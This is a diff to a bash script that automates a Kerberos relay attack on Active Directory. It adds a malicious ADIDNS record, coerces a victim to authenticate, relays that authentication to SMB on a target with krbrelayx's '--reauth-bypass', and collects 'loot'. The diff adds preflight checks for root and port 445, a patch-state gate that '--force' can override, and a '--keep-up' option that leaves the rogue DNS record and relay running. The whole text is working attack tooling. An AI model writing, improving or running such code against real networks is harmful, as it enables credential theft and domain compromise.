@@ -60,6 +60,10 @@ LOOT_DIR="$HERE/loot"
 DRY_RUN=0
 ASSUME_YES=0
 NO_NXC=0
+LOOT_WAIT=90          # auto: seconds to wait for loot after coercion
+KEEP_UP=0             # auto: leave relay + DNS record up instead of tearing down
+NO_CHECK=0            # auto: skip the patchcheck patch-state gate
+FORCE=0               # auto: coerce even if patchcheck reports the chain CLOSED
 
 # ------------------------------------------------------------------- helpers ---
 c_red=$'\033[31m'; c_grn=$'\033[32m'; c_yel=$'\033[33m'; c_cyn=$'\033[36m'; c_rst=$'\033[0m'
@@ -112,6 +116,36 @@ confirm() {
 
 # resolve the DC endpoint for LDAP (prefer FQDN so Kerberos/SPNs line up)
 dc_endpoint() { [ -n "$DC_HOST" ] && printf '%s' "$DC_HOST" || printf '%s' "$DC_IP"; }
+
+# --- host preflight (Linux relay host; skip gracefully if a tool is absent) ---
+is_local_ip() {   # 0 if $1 is an address on a local interface
+  local ip="$1" addrs=""
+  have ip       && addrs="$(ip -4 -o addr show 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"
+  [ -z "$addrs" ] && have hostname && addrs="$(hostname -I 2>/dev/null | tr ' ' '\n')"
+  printf '%s\n' "$addrs" | grep -qxF "$ip"
+}
+
+port_in_use() {   # 0 if TCP port $1 is already listening
+  local p="$1"
+  have ss      && ss -ltnH 2>/dev/null     | awk '{print $4}' | grep -qE "[:.]$p\$" && return 0
+  have netstat && netstat -ltn 2>/dev/null | awk '{print $4}' | grep -qE "[:.]$p\$" && return 0
+  return 1
+}
+
+# decide krbrelayx's -ip bind arg: bind the relay IP only if it is actually local,
+# otherwise bind all interfaces (0.0.0.0) and warn - forcing -ip on a non-local IP
+# makes krbrelayx exit immediately ("Cannot assign requested address").
+RELAY_IP_ARGS=()
+relay_ip_args() {
+  RELAY_IP_ARGS=()
+  [ -n "$RELAY_IP" ] || return 0
+  if [ "$DRY_RUN" -eq 1 ] || is_local_ip "$RELAY_IP"; then
+    RELAY_IP_ARGS=(-ip "$RELAY_IP")
+  else
+    warn "relay-ip $RELAY_IP is not a local interface here; binding all interfaces instead of -ip."
+    warn "the ADIDNS record sends victims to $RELAY_IP - make sure they reach THIS host at that IP."
+  fi
+}
 
 # ------------------------------------------------------- the coercion record ---
 RECORD=""
@@ -220,11 +254,13 @@ cmd_relay() {
   need TARGET_IP USER1 PASS1
   add_secret "$PASS1"
   [ "$(id -u 2>/dev/null || echo 1)" = "0" ] || warn "relay needs root to bind; prefix with sudo if this fails."
+  [ "$DRY_RUN" -eq 1 ] || ! port_in_use 445 || die "TCP 445 already in use (smbd/Responder?); free it: sudo systemctl stop smbd nmbd"
+  relay_ip_args
   mkdir -p "$LOOT_DIR"
   log "starting reauthx relay -> smb://$TARGET_IP  (base session: $DOMAIN/$USER1)  loot: $LOOT_DIR"
   run "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
       --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" \
-      ${RELAY_IP:+-ip "$RELAY_IP"} -l "$LOOT_DIR"
+      "${RELAY_IP_ARGS[@]}" -l "$LOOT_DIR"
 }
 
 cmd_coerce() {
@@ -245,15 +281,38 @@ cmd_coerce() {
 cmd_auto() {
   need TARGET_IP DOMAIN USER1 PASS1 RELAY_IP
   [ -n "$DC_HOST$DC_IP" ] || die "auto needs --dc-host and/or --dc-ip"
+  # the relay backgrounds here and we track/kill it by PID, so auto must BE root
+  # (not prefix a child with sudo - then $! is sudo's PID, not krbrelayx's).
+  [ "$DRY_RUN" -eq 1 ] || [ "$(id -u 2>/dev/null || echo 1)" = "0" ] || \
+    die "auto must run as root (the relay binds :445). Re-run:  sudo $0 auto ..."
+  [ "$DRY_RUN" -eq 1 ] || ! port_in_use 445 || die "TCP 445 already in use (smbd/Responder?); free it before relaying."
   compute_record
   mkdir -p "$LOOT_DIR"
+
+  # --- gate: don't fire at a target whose chain is already closed (CVE-2026-69676) ---
+  if [ "$NO_CHECK" -eq 0 ] && [ "$DRY_RUN" -eq 0 ]; then
+    log "recon gate: checking the patch state before coercing ..."
+    local pc_out
+    pc_out="$("$PY" "$HERE/patchcheck.py" "${DOMAIN}/${USER1}:${PASS1}@${TARGET_IP}" \
+             ${PROBE_USER:+--probe "${PROBE_USER}:${PROBE_PASS}"} 2>&1 || true)"
+    printf '%s\n' "$pc_out" >&2
+    if printf '%s' "$pc_out" | grep -q 'CLOSED'; then
+      [ "$FORCE" -eq 1 ] || die "patchcheck reports the chain CLOSED (CVE-2026-69676 present); the re-auth swap will fail. Use --force to coerce anyway, or --no-check to skip this gate."
+      warn "chain reported CLOSED but --force set; continuing."
+    fi
+  fi
 
   RELAY_PID=""
   cleanup() {
     local ec=$?
+    if [ "$KEEP_UP" -eq 1 ]; then
+      warn "--keep-up: leaving relay (pid ${RELAY_PID:-?}) and DNS record '$RECORD' in place."
+      warn "tear down when done:  sudo kill ${RELAY_PID:-<pid>}  &&  $0 dns-del -H '$TARGET_HOST' -d '$DOMAIN' ${DC_HOST:+--dc-host '$DC_HOST'} ${DC_IP:+--dc-ip '$DC_IP'} -u '$USER1' -p '<pass>'"
+      exit $ec
+    fi
     warn "teardown ..."
     if [ -n "${RELAY_PID:-}" ] && kill -0 "$RELAY_PID" 2>/dev/null; then
-      log "stopping relay (pid $RELAY_PID)"; kill "$RELAY_PID" 2>/dev/null || sudo kill "$RELAY_PID" 2>/dev/null || true
+      log "stopping relay (pid $RELAY_PID)"; kill "$RELAY_PID" 2>/dev/null || true
     fi
     ASSUME_YES=1 cmd_dns_del || warn "DNS record NOT removed - delete '$RECORD' by hand!"
     exit $ec
@@ -262,36 +321,42 @@ cmd_auto() {
 
   cmd_dns_add
 
+  relay_ip_args
   log "launching relay in the background ..."
-  local sudo=""; [ "$(id -u 2>/dev/null || echo 1)" = "0" ] || sudo="sudo"
   if [ "$DRY_RUN" -eq 1 ]; then
-    run $sudo "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
-        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" -ip "$RELAY_IP" -l "$LOOT_DIR"
+    run "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
+        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" "${RELAY_IP_ARGS[@]}" -l "$LOOT_DIR"
   else
-    $sudo "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
-        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" -ip "$RELAY_IP" -l "$LOOT_DIR" \
+    "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
+        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" "${RELAY_IP_ARGS[@]}" -l "$LOOT_DIR" \
         >"$LOOT_DIR/relay.log" 2>&1 &
     RELAY_PID=$!
-    log "relay pid $RELAY_PID (log: $LOOT_DIR/relay.log); waiting for it to come up ..."
-    local i; for i in $(seq 1 10); do
-      kill -0 "$RELAY_PID" 2>/dev/null || die "relay exited early - see $LOOT_DIR/relay.log"
-      grep -qiE 'server.*start|listening|setting up' "$LOOT_DIR/relay.log" 2>/dev/null && break
+    log "relay pid $RELAY_PID (log: $LOOT_DIR/relay.log); waiting for it to bind :445 ..."
+    local i up=0
+    for i in $(seq 1 15); do
+      kill -0 "$RELAY_PID" 2>/dev/null || die "relay exited early - see $LOOT_DIR/relay.log  (last line: $(tail -n1 "$LOOT_DIR/relay.log" 2>/dev/null))"
+      port_in_use 445 && { up=1; break; }
       sleep 1
     done
+    [ "$up" -eq 1 ] && ok "relay is listening on :445" || warn "relay running (pid $RELAY_PID) but :445 not detected; continuing anyway."
   fi
 
   cmd_coerce
 
   if [ "$DRY_RUN" -eq 0 ]; then
-    log "coercion fired; waiting up to 60s for loot to land in $LOOT_DIR ..."
+    log "coercion fired; waiting up to ${LOOT_WAIT}s for loot to land in $LOOT_DIR ..."
     local before after i; before="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
-    for i in $(seq 1 60); do
+    for i in $(seq 1 "$LOOT_WAIT"); do
       after="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
       [ "$after" -gt "$before" ] && { ok "new loot in $LOOT_DIR:"; ls -1t "$LOOT_DIR" | grep -v relay.log | head >&2; break; }
       sleep 1
     done
   fi
-  ok "done; teardown trap will remove the DNS record and stop the relay."
+  if [ "$KEEP_UP" -eq 1 ]; then
+    ok "done; --keep-up set: relay + DNS record left in place (teardown hint printed at exit)."
+  else
+    ok "done; teardown trap will remove the DNS record and stop the relay."
+  fi
 }
 
 # ----------------------------------------------------------------- arg parse ---
@@ -323,6 +388,10 @@ Options (each command uses only the ones it needs):
     -n, --dry-run             print commands (secrets masked), run nothing
     -y, --yes                 don't prompt before outbound/destructive steps
         --no-nxc              recon: patchcheck only, skip the nxc module
+        --loot-wait N         auto: seconds to wait for loot after coercion (default 90)
+        --keep-up             auto: leave relay + DNS record up instead of tearing down
+        --no-check            auto: skip the patchcheck patch-state gate
+        --force               auto: coerce even if patchcheck reports the chain CLOSED
     -h, --help
 EOF
 }
@@ -351,6 +420,10 @@ while [ $# -gt 0 ]; do
     -n|--dry-run)     DRY_RUN=1; shift;;
     -y|--yes)         ASSUME_YES=1; shift;;
     --no-nxc)         NO_NXC=1; shift;;
+    --loot-wait)      LOOT_WAIT="$2"; shift 2;;
+    --keep-up)        KEEP_UP=1; shift;;
+    --no-check)       NO_CHECK=1; shift;;
+    --force)          FORCE=1; shift;;
     -h|--help)        usage; exit 0;;
     *) die "unknown option: $1  (see: $0 help)";;
   esac
